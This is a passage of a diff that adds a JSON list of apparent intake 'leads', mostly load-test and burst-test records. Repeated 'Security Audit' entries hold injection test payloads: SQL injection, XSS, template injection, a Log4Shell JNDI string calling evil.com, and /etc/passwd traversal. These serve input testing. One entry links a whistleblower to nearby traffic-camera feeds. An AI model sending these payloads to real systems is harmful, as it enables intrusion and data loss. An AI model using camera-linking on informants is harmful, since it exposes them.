+      "evidence": "Intake submission: Burst Test | Burst request 16"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0044",
+      "entity_name": "CONCURRENT USER 17",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 17"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0045",
+      "entity_name": "CONCURRENT USER 18",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 18"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0046",
+      "entity_name": "CONCURRENT USER 19",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 19"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0047",
+      "entity_name": "CONCURRENT USER 20",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 20"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0048",
+      "entity_name": "CONCURRENT USER 21",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 21"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0049",
+      "entity_name": "CONCURRENT USER 22",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 22"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0050",
+      "entity_name": "CONCURRENT USER 23",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 23"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0051",
+      "entity_name": "CONCURRENT USER 24",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 24"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0052",
+      "entity_name": "CONCURRENT USER 25",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 25"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0053",
+      "entity_name": "CONCURRENT USER 26",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 26"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0054",
+      "entity_name": "CONCURRENT USER 27",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 27"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0055",
+      "entity_name": "CONCURRENT USER 28",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 28"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0056",
+      "entity_name": "CONCURRENT USER 29",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 29"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0057",
+      "entity_name": "WHISTLEBLOWER WITNESS A",
+      "address": "ANAHEIM, CA",
+      "apn": null,
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Disclosure | Evidence of $1.5M COVID relief diversion to Chamber of Commerce."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0058",
+      "entity_name": "ANONYMOUS",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: General Inquiry | "
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0059",
+      "entity_name": "ANONYMOUS",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: General Inquiry | "
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0060",
+      "entity_name": "LARGE PAYLOAD TEST",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Stress Test | AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0061",
+      "entity_name": "; DROP TABLE CASES;",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | '; DROP TABLE cases; --"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0062",
+      "entity_name": "<SCRIPT>ALERT XSS < SCRIPT>",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | <script>alert('XSS')</script>"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0063",
+      "entity_name": "{{7*7}}",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | {{7*7}}"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0064",
+      "entity_name": "${JNDI:LDAP: EVIL COM A}",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | ${jndi:ldap://evil.com/a}"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0065",
+      "entity_name": "ETC PASSWD",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | ../../../../etc/passwd"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0066",
+      "entity_name": "🚨 WHISTLEBLOWER 🕵️‍♂️ ‮REVERSED‬",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: International Corruption | Multi-lingual evidence: 日本語, العربية, 中文, Русский."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0067",
+      "entity_name": "CONCURRENT USER 0",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 0"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0068",
+      "entity_name": "CONCURRENT USER 1",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 1"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0069",
+      "entity_name": "CONCURRENT USER 2",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 2"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0070",
+      "entity_name": "CONCURRENT USER 3",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 3"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0071",
+      "entity_name": "CONCURRENT USER 4",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 4"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0072",
+      "entity_name": "CONCURRENT USER 5",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 5"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0073",
+      "entity_name": "CONCURRENT USER 6",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 6"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0074",
+      "entity_name": "CONCURRENT USER 7",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 7"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0075",
+      "entity_name": "CONCURRENT USER 8",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 8"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0076",
+      "entity_name": "CONCURRENT USER 9",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 9"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0077",
+      "entity_name": "CONCURRENT USER 10",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 10"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0078",
+      "entity_name": "CONCURRENT USER 11",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 11"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0079",
+      "entity_name": "CONCURRENT USER 12",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 12"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0080",
+      "entity_name": "CONCURRENT USER 13",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 13"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0081",
+      "entity_name": "CONCURRENT USER 14",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 14"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0082",
+      "entity_name": "CONCURRENT USER 15",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 15"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0083",
+      "entity_name": "CONCURRENT USER 16",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 16"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0084",
+      "entity_name": "CONCURRENT USER 17",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 17"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0085",
+      "entity_name": "CONCURRENT USER 18",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 18"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0086",
+      "entity_name": "CONCURRENT USER 19",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 19"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0087",
+      "entity_name": "CONCURRENT USER 20",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 20"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0088",
+      "entity_name": "CONCURRENT USER 21",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 21"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0089",
+      "entity_name": "CONCURRENT USER 22",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 22"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0090",
+      "entity_name": "CONCURRENT USER 23",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 23"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0091",
+      "entity_name": "CONCURRENT USER 24",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 24"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0092",
+      "entity_name": "CONCURRENT USER 25",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 25"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0093",
+      "entity_name": "CONCURRENT USER 26",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 26"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0094",
+      "entity_name": "CONCURRENT USER 27",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 27"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0095",
+      "entity_name": "CONCURRENT USER 28",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 28"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0096",
+      "entity_name": "CONCURRENT USER 29",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 29"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0097",
+      "entity_name": "ANONYMOUS",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: General Inquiry | "
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0098",
+      "entity_name": "ANONYMOUS",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: General Inquiry | "
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0099",
+      "entity_name": "LARGE PAYLOAD TEST",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Stress Test | AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0100",
+      "entity_name": "; DROP TABLE CASES;",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | '; DROP TABLE cases; --"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0101",
+      "entity_name": "<SCRIPT>ALERT XSS < SCRIPT>",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | <script>alert('XSS')</script>"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0102",
+      "entity_name": "{{7*7}}",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | {{7*7}}"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0103",
+      "entity_name": "${JNDI:LDAP: EVIL COM A}",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | ${jndi:ldap://evil.com/a}"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0104",
+      "entity_name": "ETC PASSWD",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | ../../../../etc/passwd"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0105",
+      "entity_name": "🚨 WHISTLEBLOWER 🕵️‍♂️ ‮REVERSED‬",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: International Corruption | Multi-lingual evidence: 日本語, العربية, 中文, Русский."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0106",
+      "entity_name": "CONCURRENT USER 0",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 0"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0107",
+      "entity_name": "CONCURRENT USER 1",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 1"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0108",
+      "entity_name": "CONCURRENT USER 2",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 2"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0109",
+      "entity_name": "CONCURRENT USER 3",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 3"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0110",
+      "entity_name": "CONCURRENT USER 4",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 4"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0111",
+      "entity_name": "CONCURRENT USER 5",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 5"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0112",
+      "entity_name": "CONCURRENT USER 6",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 6"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0113",
+      "entity_name": "CONCURRENT USER 7",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 7"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0114",
+      "entity_name": "CONCURRENT USER 8",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 8"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0115",
+      "entity_name": "CONCURRENT USER 9",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 9"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0116",
+      "entity_name": "CONCURRENT USER 10",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 10"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0117",
+      "entity_name": "CONCURRENT USER 11",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 11"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0118",
+      "entity_name": "CONCURRENT USER 12",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 12"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0119",
+      "entity_name": "CONCURRENT USER 13",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 13"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0120",
+      "entity_name": "CONCURRENT USER 14",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 14"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0121",
+      "entity_name": "CONCURRENT USER 15",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 15"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0122",
+      "entity_name": "CONCURRENT USER 16",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 16"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0123",
+      "entity_name": "CONCURRENT USER 17",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 17"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0124",
+      "entity_name": "CONCURRENT USER 18",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 18"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0125",
+      "entity_name": "CONCURRENT USER 19",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 19"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0126",
+      "entity_name": "CONCURRENT USER 20",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 20"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0127",
+      "entity_name": "CONCURRENT USER 21",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 21"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0128",
+      "entity_name": "CONCURRENT USER 22",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 22"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0129",
+      "entity_name": "CONCURRENT USER 23",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 23"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0130",
+      "entity_name": "CONCURRENT USER 24",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 24"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0131",
+      "entity_name": "CONCURRENT USER 25",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 25"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0132",
+      "entity_name": "CONCURRENT USER 26",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 26"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0133",
+      "entity_name": "CONCURRENT USER 27",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 27"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0134",
+      "entity_name": "CONCURRENT USER 28",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 28"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0135",
+      "entity_name": "CONCURRENT USER 29",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Burst Test | Burst request 29"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0136",
+      "entity_name": "ANONYMOUS",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: General Inquiry | "
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0137",
+      "entity_name": "ANONYMOUS",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: General Inquiry | "
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0138",
+      "entity_name": "LARGE PAYLOAD TEST",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Stress Test | AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0139",
+      "entity_name": "; DROP TABLE CASES;",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | '; DROP TABLE cases; --"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0140",
+      "entity_name": "<SCRIPT>ALERT XSS < SCRIPT>",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | <script>alert('XSS')</script>"
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0141",
+      "entity_name": "{{7*7}}",
+      "address": null,
+      "apn": null,
+      "proximity_cctv": [],
+      "evidence": "Intake submission: Security Audit | {{7*7}}"
+    },
+    {
